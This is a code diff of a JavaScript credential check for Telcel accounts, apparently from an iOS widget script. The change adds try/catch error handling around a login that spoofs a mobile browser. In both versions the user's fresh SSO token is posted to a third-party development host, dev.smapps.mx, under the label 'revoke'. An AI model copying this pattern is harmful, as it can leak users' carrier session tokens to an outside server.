@@ -27,49 +27,56 @@ const COLORS = {
 };
 
 async function validateTelcelCredentials(phone, password) {
-  const passClean = String(password || "").replace(/\s+/g, "");
-  const pB64 = typeof Data !== "undefined"
-    ? Data.fromString(passClean).toBase64String()
-    : Buffer.from(passClean, "utf8").toString("base64");
-  const ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1";
-  const loginJson = await requestTelcel(
-    "https://wbl.telcel-id.com:8443/login",
-    "POST",
-    {
-      "Origin": "https://wbl.telcel-id.com:8443",
-      "Referer": "https://wbl.telcel-id.com:8443/login?sitedomain=https://www.mitelcel.com&CCode=52&Type=MSISDN&Invocation=iFrame",
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "X-Requested-With": "XMLHttpRequest",
-      "User-Agent": ua
-    },
-    [
-      `username=${encodeURIComponent(phone)}`,
-      `telcel-pass=${encodeURIComponent(password)}`,
-      "sitedomain=https://www.mitelcel.com",
-      "CCode=52",
-      "Type=MSISDN",
-      "Invocation=iFrame",
-      `MSISDN=${encodeURIComponent(phone)}`,
-      "Source=",
-      `pB64=${encodeURIComponent(pB64)}`,
-      "url=https://wbl.telcel-id.com:8443"
-    ].join("&")
-  );
-  const ssoToken = loginJson?.token;
-  if (!ssoToken) return false;
   try {
-    await requestTelcel(
-      "https://dev.smapps.mx:9000/sso/revoke",
+    const passClean = String(password || "").replace(/\s+/g, "");
+    const pB64 = typeof Data !== "undefined"
+      ? Data.fromString(passClean).toBase64String()
+      : Buffer.from(passClean, "utf8").toString("base64");
+    const ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1";
+    const loginJson = await requestTelcel(
+      "https://wbl.telcel-id.com:8443/login",
       "POST",
       {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "Accept": "application/json"
+        "Origin": "https://wbl.telcel-id.com:8443",
+        "Referer": "https://wbl.telcel-id.com:8443/login?sitedomain=https://www.mitelcel.com&CCode=52&Type=MSISDN&Invocation=iFrame",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": ua
       },
-      `token=${encodeURIComponent(ssoToken)}&token_type=revoke`,
-      false
+      [
+        `username=${encodeURIComponent(phone)}`,
+        `telcel-pass=${encodeURIComponent(password)}`,
+        "sitedomain=https://www.mitelcel.com",
+        "CCode=52",
+        "Type=MSISDN",
+        "Invocation=iFrame",
+        `MSISDN=${encodeURIComponent(phone)}`,
+        "Source=",
+        `pB64=${encodeURIComponent(pB64)}`,
+        "url=https://wbl.telcel-id.com:8443"
+      ].join("&")
     );
-  } catch (_) {}
-  return true;
+    const ssoToken = loginJson?.token;
+    if (!ssoToken) return false;
+    try {
+      await requestTelcel(
+        "https://dev.smapps.mx:9000/sso/revoke",
+        "POST",
+        {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Accept": "application/json"
+        },
+        `token=${encodeURIComponent(ssoToken)}&token_type=revoke`,
+        false
+      );
+    } catch (_) {}
+    return true;
+  } catch (err) {
+    if (String(err?.message || "").includes("400") || String(err?.message || "").includes("401") || String(err?.message || "").includes("403")) {
+      return false;
+    }
+    throw err;
+  }
 }
 
 async function getCredentials(validator = validateTelcelCredentials) {
